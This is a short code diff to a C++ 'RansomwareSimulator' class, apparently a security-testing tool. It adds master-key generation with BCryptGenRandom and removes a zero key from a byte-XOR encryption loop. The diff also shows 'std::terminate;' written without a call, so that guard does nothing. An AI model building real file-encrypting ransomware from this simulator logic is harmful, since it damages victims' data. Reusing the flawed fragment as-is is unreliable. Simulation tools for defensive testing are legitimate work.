@@ -21,6 +21,11 @@ namespace maltech {
         RansomwareSimulator::RansomwareSimulator(ntdll::NtDll& ntdll)
             : ntdll_(ntdll)
         {
+            auto status = BCryptGenRandom
+            (NULL, masterkey_, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+            if (!NT_SUCCESS(status)) {
+                throw std::runtime_error("Masterkey generation error");
+            }
         }
 
         void RansomwareSimulator::StartEncryptingSimulation() {
@@ -147,7 +152,6 @@ namespace maltech {
                 
             }
             else {
-                const int key = 0;
                 for (int i = 0; i < size; ++i) {
                     if (key_) { std::terminate; }
                     bytes[i] ^= key_;
